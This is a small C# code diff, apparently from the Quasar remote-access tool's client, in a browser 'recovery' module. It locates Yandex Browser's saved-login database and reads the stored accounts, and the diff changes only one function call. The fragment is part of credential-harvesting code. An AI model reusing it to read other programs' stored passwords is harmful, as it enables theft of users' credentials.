@@ -17,7 +17,7 @@ namespace Quasar.Client.Recovery.Browsers
             {
                 string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                 "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
-                return ReadAccounts(filePath, ApplicationName);
+                return ReadAccounts(filePath, null, ApplicationName);
             }
             catch (Exception)
             {
